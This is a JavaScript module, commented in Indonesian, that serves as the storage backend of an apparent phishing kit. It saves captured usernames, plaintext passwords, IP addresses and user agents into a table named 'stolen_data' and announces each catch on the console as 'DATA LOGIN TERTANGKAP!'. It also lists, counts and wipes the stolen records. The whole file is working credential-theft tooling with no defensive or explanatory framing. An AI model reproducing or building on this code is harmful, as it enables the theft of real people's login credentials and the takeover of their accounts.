import { db } from './config.js';

// Fungsi simpan data
export function saveData(username, password, ip, userAgent) {
    const stmt = db.prepare(`
        INSERT INTO stolen_data (username, password, ip, user_agent)
        VALUES (?, ?, ?, ?)
    `);
    
    stmt.run(username, password, ip, userAgent, (err) => {
        if (err) {
            console.error('Error saving data:', err.message);
        } else {
            console.log('\n========================================');
            console.log('DATA LOGIN TERTANGKAP!');
            console.log(`Username: ${username}`);
            console.log(`Password: ${password}`);
            console.log(`IP: ${ip}`);
            console.log('========================================\n');
        }
    });
    
    stmt.finalize();
}

// Fungsi ambil semua data
export function getAllData() {
    return new Promise((resolve, reject) => {
        db.all('SELECT * FROM stolen_data ORDER BY id DESC', (err, rows) => {
            if (err) reject(err);
            else resolve(rows);
        });
    });
}

// Fungsi hapus semua data
export function clearAllData() {
    return new Promise((resolve, reject) => {
        db.run('DELETE FROM stolen_data', (err) => {
            if (err) reject(err);
            else resolve();
        });
    });
}

// Fungsi dapatkan statistik
export function getStats() {
    return new Promise((resolve, reject) => {
        db.get('SELECT COUNT(*) as total FROM stolen_data', (err, result) => {
            if (err) reject(err);
            else resolve(result);
        });
    });
}

// Fungsi tutup database
export function closeDatabase() {
    db.close((err) => {
        if (err) {
            console.error('Error closing database:', err.message);
        } else {
            console.log('Database closed');
        }
    });
}